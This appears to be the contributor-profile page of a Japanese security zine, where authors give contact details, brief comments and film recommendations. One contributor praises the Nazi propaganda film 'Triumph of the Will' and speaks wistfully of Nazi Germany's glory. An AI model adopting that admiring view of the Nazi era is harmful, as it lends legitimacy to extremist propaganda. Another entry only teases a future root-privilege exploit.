+　最近は忙しくて映画をすっかり見なくなってしまったのですが（代わりにPSPで
+エースコンバットにはまっている。撃墜王と呼んでくだちい）、とりあえず印象
+に残っているものを以下に列挙する。
+・硫黄島からの手紙
+・バタフライ・エフェクト
+　硫黄島からの～はアメリカで制作されてるのに全部日本語というﾌｧﾝｷｰな戦争映
+画で、実話かと思うと涙なくしては見れません（ら抜き表現）。バタフライ・エフ
+ェクトはヘッドホンで爆音でみるとけっこう怖いのでホラーにも分類できるんじゃ
+ないかと思います。ｵｴｲｾｽ！ｵｴｲｾｽ！
+
+
+■Green boy 4
+●Job: Closed
+●Web: N/A
+●Mail: greenboy4@gmail.com
+●Team（Group): N/A
+●Comment: 
+　最近時間がない病で困っています。皆さん、どうやって時間を作られているん
+でしょう…？
+●好きな映画・お勧めの映画: 
+　ライフイズビューティフルです。子供の無邪気さとお父さんの陽気さがたまり
+ません。そして、前半ののほほんとした感じから、後半の怒涛の展開が最高です
+
+
+■理事長（Rudolph von Gartheimer）
+●Job:執行統括理事長
+●Web:http://www.gartheimer.com/
+●Mail:gartheimer@hotmail.com
+●Team（Group）：宗凶法人 愛連合
+●Comment:
+　今回のネタは実は、ウチのメルマガの焼き直しです…。読者層が多い、IPUSIR
+ON殿のところで発表した方が、学ぶ機会が多いと思い、投稿いたしました。
+　これからも、コンテンツを見直しつつ投稿できたらいいなぁ…と考えております。
+●好きな映画・お勧めの映画：
+　レニ・リーフェンシュタール監督「意志の勝利」
+　単なるプロパガンダ映画にとどまらない、芸術作品映画。それを証明する証拠
+に、37年のパリ万博で金賞を得ています。ナチス・ドイツの様式美、世界に冠た
+るドイツが輝いていた時代を見るに、今のドイツを見ていると暗くなる思いです。
+これは日本にも言える事です。「靖国」という映画に政治的圧力があるくらいで
+すから……ひどい話です。「意志の勝利」は著作権が切れていますけれど、入手
+が難しいです。どこかにUpれないものだろうか……。YOUTUBEとかは画質最悪です
+し…。
+
+
+■Defolos
+●Job: Student
+●Web: http://ruffnex.oc.to/defolos/
+●Mail: defolos@ruffnex.oc.to
+●Team（Group): none
+●Comment:
+　こんにちは、Defolosです。今回はメモリ内を読み出しただけで、ちょっと物足
+りなさを感じた方もいらっしゃるとおもいます。次回は実際にroot権限を奪取す
+る手法を紹介します。それでは次回お会いしましょう。
+●好きな映画・おすすめの映画
+　「グラディエーター」がおすすめです。アクションやセリフのよさもあります
+が、人民主体の国という理想のローマを実現するために活躍する剣闘士（元ロー
+マ将軍）の生き様がカッコいいですね。
+
+
+■IPUSIRON
+●Job: 見習い戦士
+●Web: http://akademeia.info/
+●Mail: ipusiron@gmail.com
+●Comment:
+　現在某IT会社で研修中です。いままでぐーたら好きな時間に寝ていましたが、
+これからはそれができないのが一番辛いです。
+●好きな映画・お勧めの映画: 
+　比較的どんなジャンルでも見ますが、特にパニック映画やSF映画が好きです。
+しかしパニック映画に当たり作品が少ないと思います。それでも文明再建のネタ
+としては参考になるので、まったく無駄ではないと思います（信じたいです）。
+SF映画なら「スターシップ・トゥルーパーズ」「コンタクト」「エイリアン」シ
+リーズなど。
+　最近は過去に見た映画をもう一度観てみたいという衝動が出てます。例えば「
+エレファント」「遊星からの物体X」「犯罪心理捜査官」「キャリー」など（「エ
+レファント」を見てつまらなくても、苦情は受け付けません）。
+　まだ見ていないけど気になる映画として、「黒い太陽731部隊」「ザザンボ」が
+あります。
+　ところで、すでに知っている人もいるかもしれませんが、観た映画は次に紹介
+するWebサイトで確認するとより深い理解に繋がると思います。
+http://www.movie-faq.com/
+http://anokoko.com/
+
+
